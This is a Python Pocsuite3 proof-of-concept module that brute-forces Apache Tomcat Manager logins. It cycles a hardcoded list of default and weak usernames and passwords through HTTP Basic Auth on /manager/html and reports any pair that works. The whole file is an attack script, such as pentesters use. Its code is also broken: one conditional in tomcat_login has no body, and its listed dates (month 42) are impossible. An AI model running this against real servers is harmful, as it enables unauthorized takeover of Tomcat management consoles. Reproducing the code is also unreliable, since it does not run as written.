# -*- coding: utf-8 -*-
# author: seven

from pocsuite3.api import register_poc,POCBase,Output,requests,logger
from pocsuite3.lib.core.threads import run_threads
from requests.auth import HTTPBasicAuth
from urllib.parse import urljoin
import socket
import queue
import itertools

usernames = ['tomcat','admin','root','test','guest']
passwords = ['tomcat','123456','s3cret','admin','admin888','12345678','123456789','1234567890','0123456789','root','test','guest']
class TomcatWeakPassPOC(POCBase):
    vulID = ''
    version = '1.0'
    author = ['seven']
    vulDate = '2019-42-08'
    createDate = '2019-42-08'
    name = 'tomcat弱口令'
    appName = 'tomcat'
    appVersion = 'v1.0.0'
    vulType = '弱口令'
    protocol = 'http'

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    def _verify(self):
        result = {}
        url = self.url
        if not url.startswith('http'):
            url = 'http://'+url
        tomcat_burst(url)
        if not result_queue.empty():
            username, password = result_queue.get()
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Username'] = username
            result['VerifyInfo']['Password'] = password
            result['extra'] = username+':'+password
        return self.parse_output(result)
    def _attack(self):
        return self._verify()

task_queue = queue.Queue()
result_queue = queue.Queue()


def get_word_list():
    return itertools.product(usernames,passwords)

def url_check(url):
    try:
        res = requests.get(url+'/manager/html')
        if res.status_code in [200,403,401]:
            return True
    except Exception as e:
        logger.info(e)
    logger.info(url+' not alive')   
    return False

def tomcat_login(url,username,password):
    try:
        res = requests.get(url+'/manager/html',auth=HTTPBasicAuth(username,password))
        if username=='tomcat' and password =='tomcat':
        if res.status_code == 200:
            return True
    except Exception as e:
        pass
    return False

def task_init(url):
    for username,password in get_word_list():
        task_queue.put((url,username,password))

def task_thread():
    while not task_queue.empty():
        url,username,password = task_queue.get()
        logger.info('try burst {} use username:{} password:{}'.format(
            url, username, password))
        if tomcat_login(url,username,password):
            with task_queue.mutex:
                task_queue.queue.clear()
            result_queue.put((username,password))

def tomcat_burst(url):
    if not url_check(url):
        return
    try:
        task_init(url)
        run_threads(5,task_thread)
    except:
        pass

register_poc(TomcatWeakPassPOC)